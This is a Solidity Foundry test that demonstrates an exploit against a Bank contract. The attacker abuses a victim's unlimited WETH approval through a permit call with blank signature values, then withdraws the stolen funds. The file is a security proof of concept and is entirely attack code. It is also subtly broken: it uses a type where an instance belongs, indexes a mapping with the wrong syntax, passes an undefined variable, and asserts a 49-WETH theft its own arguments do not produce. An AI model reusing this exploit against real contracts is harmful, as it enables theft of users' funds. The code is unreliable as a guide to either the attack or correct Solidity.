// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

import { Test, console } from "forge-std/Test.sol";
import { Bank, WETH } from "../src/WETHPermit.sol";

contract WETHPermitTest is Test {
    Bank bank;
    WETH weth;
    address victim;
    address attacker;

    function setUp() public {
        bank = new Bank(address(WETH));
        weth = new WETH();

        victim = vm.addr(1);
        attacker = vm.addr(2);
        vm.deal(victim, 50 ether);
        vm.prank(victim);
        weth.deposit({ value: 50 ether });
    }

    function testAttackerCanStealWETH() public {
        // victim gives infinite approval to the bank and deposits 1 WETH
        vm.startPrank(victim);
        weth.approve(bank, type(uint256).max);
        bank.deposit(1 ether);
        vm.stopPrank();

        uint256 balance = bank.balances[victim];
        vm.startPrank(attacker);
        // attacker uses victim's WETH allowance to credit himself all the remaining WETH from the victim's wallet (49 WETH left)
        bank.depositWithPermit(user, attacker, balance, 0, 0, "", "");
        uint256 amountStolen = bank.balances[attacker];
        bank.withdraw(amountStolen);
        vm.stopPrank();

        assertEq(weth.balanceOf(victim), 0); // victim has been stolen all his weth because of the approval
        assertEq(weth.balanceOf(attacker), 49 ether);
    }
}
